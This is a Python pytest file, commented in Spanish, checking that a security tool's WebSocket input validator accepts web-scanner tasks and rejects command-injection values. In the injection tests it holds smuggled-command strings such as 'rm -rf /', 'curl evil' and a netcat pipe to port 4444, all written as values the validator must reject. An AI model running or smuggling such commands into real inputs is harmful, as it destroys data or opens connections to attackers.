"""Regresión: el validador WS debe permitir y sanear las tareas de scanners web.

Antes faltaban en ALLOWED_TASKS (web_exposure, api_security, web_headers, dns,
tls, subdomain_enum, nuclei) y, además, se descartaban sus parámetros — los
scanners quedaban inaccesibles por WebSocket ("Tarea no permitida").
"""
import pytest

from cyberhound.core.security import InputValidator, ValidationError


class TestUrlList:
    def test_accepts_urls_and_hosts(self):
        out = InputValidator.url_list(["https://a.com/p", "192.168.1.1", "host.local:8080"])
        assert out == ["https://a.com/p", "192.168.1.1", "host.local:8080"]

    def test_accepts_comma_or_newline_string(self):
        assert InputValidator.url_list("a.com, b.com\nc.com") == ["a.com", "b.com", "c.com"]

    @pytest.mark.parametrize("bad", [
        "http://a.com; rm -rf /",
        "a.com && curl evil",
        "`whoami`.com",
        "http://a.com | nc evil 4444",
        "host with space",
        "$(id).com",
    ])
    def test_rejects_injection(self, bad):
        with pytest.raises(ValidationError):
            InputValidator.url_list([bad])

    def test_caps_count(self):
        with pytest.raises(ValidationError):
            InputValidator.url_list([f"h{i}.com" for i in range(60)], max_items=50)


class TestWsMessageNewTasks:
    @pytest.mark.parametrize("task", [
        "web_exposure", "api_security", "web_headers", "nuclei",
    ])
    def test_url_tasks_allowed_and_sanitized(self, task):
        out = InputValidator.ws_message({"task": task, "urls": ["https://x.com"]})
        assert out["task"] == task
        assert out["urls"] == ["https://x.com"]

    @pytest.mark.parametrize("task", ["subdomain_enum", "dns"])
    def test_domain_tasks(self, task):
        out = InputValidator.ws_message({"task": task, "domains": ["x.com"]})
        assert out["domains"] == ["x.com"]

    def test_tls_targets(self):
        out = InputValidator.ws_message({"task": "tls", "targets": ["x.com", "1.1.1.1"]})
        assert out["targets"] == ["x.com", "1.1.1.1"]

    def test_nuclei_severities_filtered(self):
        out = InputValidator.ws_message(
            {"task": "nuclei", "urls": ["https://x.com"], "severities": ["critical", "high"]}
        )
        assert out["severities"] == ["critical", "high"]

    def test_nuclei_invalid_severity_rejected(self):
        with pytest.raises(ValidationError):
            InputValidator.ws_message(
                {"task": "nuclei", "urls": ["https://x.com"], "severities": ["bogus"]}
            )

    def test_injection_in_urls_rejected(self):
        with pytest.raises(ValidationError):
            InputValidator.ws_message({"task": "web_exposure", "urls": ["a.com; rm -rf /"]})

    def test_unknown_task_still_rejected(self):
        with pytest.raises(ValidationError):
            InputValidator.ws_message({"task": "definitely_not_a_task"})
